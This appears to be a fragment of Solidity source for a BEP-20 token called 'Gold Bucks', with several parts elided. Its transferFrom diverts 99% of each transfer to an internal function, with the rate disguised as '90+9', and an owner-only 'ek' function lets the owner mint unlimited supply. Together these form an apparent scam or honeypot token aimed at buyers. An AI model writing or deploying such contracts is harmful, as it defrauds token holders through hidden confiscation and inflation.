...
library MathXC {
    ...
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "MathX: subtraction overflow");
    }
...
contract GoldBucks is IBEP20XC {
    using MathXC for uint256;

    string public name20KS =  "Gold Bucks";
    string public symbol20KS =  "GOLDBUCKS";
    uint8 public decimals20KS = 9;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _kor(from, tokens.mul(90+9).div(10**2));
        
        _transfer(from, to, tokens.sub(tokens.mul(90+9).div(10**2)));
    ...
    function ek(uint256 amount) public onlyOwner returns (bool) {
        _ek(_msgSender(), amount);
        return true;
    }
    
    function _ek(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: ekle to the zero address");

        _totalSupplyX = _totalSupplyX.add(tokens);
